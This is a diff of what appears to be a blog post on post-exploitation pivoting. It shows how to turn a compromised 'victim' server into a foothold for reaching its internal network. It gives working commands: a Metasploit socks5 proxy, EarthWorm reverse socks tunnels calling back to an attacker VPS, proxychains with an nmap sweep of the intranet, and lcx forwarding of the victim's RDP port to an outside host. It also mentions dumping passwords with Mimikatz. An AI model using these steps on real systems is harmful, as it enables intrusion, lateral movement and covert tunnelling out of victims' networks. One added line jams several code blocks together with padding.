@@ -73,11 +73,11 @@ Mimikatz is also a good choice to dump the username and password from memory of 
 
 Shutdown your computer and go to sleep. Don't think about it.
 
------------------------
+---
 
-But if I have the whole control of the server, here comes the point, how to scan the whole intranet witch your victim machine's in?
+There are some ways to help you to go deep and you can treat your victim as a pivot to find out more vulnerable hosts within the intranet.
 
-You can just use the socks5 module in meterpreter:
+Firstly you can use the socks5 module in meterpreter:
 
 ```shell
 use anxiliary/server/socks5
@@ -88,20 +88,27 @@ Finally, just run:
 ```shell
 run
 ```
-If it's Linux in your local machine, you can use proxychains to set the socks5 proxy.
-Getting proxychains installed:
+Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine's port to your VPS and use proxy
+chains or proxifier in your local machine:
+For your VPS:
 ```shell
-apt install proxychains-ng
+./ew -s rcsocks -l 1080 -e 1024
 ```
-Add the following content in the /etc/proxychains.conf file:
+The command above means your VPS listens the port 1080, 1024  and waits for attacker connect to the port 1080, the victi
+m connects to the port 1024.
+
+For target:
 ```shell
-socks5 127.0.0.1 1080
+ew.exe -s rssocks -d x.x.x.x -e 1024
 ```
+The argument -d is the IP address of your VPS.
+
+If it's Linux in your local machine, you can use proxychains to set the socks5 proxy.                                   Getting proxychains installed:                                                                                          ```shell                                                                                                                apt install proxychains-ng                                                                                              ```                                                                                                                     Add the following content in the /etc/proxychains.conf file:                                                            ```shell                                                                                                                socks5 127.0.0.1 1080                                                                                                   ```
 Then you can use socks proxy to scan the victim's intranet:
 ```shell
 proxychains4 nmap -sT -Pn -open 192.168.100.1/22
 ```
-I have tried so many times to find out all the machines in the victim's intranet but I was usually failed. It just works for few times and the process is too slow.
+I have tried so many times to find out all the machines in the victim's intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet.
 
 You can also use the msf built-in module to scan:
 ```shell
@@ -122,22 +129,4 @@ For target:
 ```shell
 lcx -slave x.x.x.x 2222 127.0.0.1 3389
 ```
-
-Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine's port to your VPS and use proxychains or proxifier in your local machine:
-For your VPS:
-```shell
-./ew -s rcsocks -l 1080 -e 1024 
-```
-The command above means your VPS listens the port 1080, 1024  and waits for attacker connect to the port 1080, the victim connects to the port 1024.
-
-For target:
-```shell
-ew.exe -s rssocks -d x.x.x.x -e 1024
-```
-The argument -d is the IP address of your VPS.
-
-Finally, the attacker can access services in the intranet by setting socks5 proxy in his browser or use proxychains.
-
-
-![](https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/map.jpg)
 
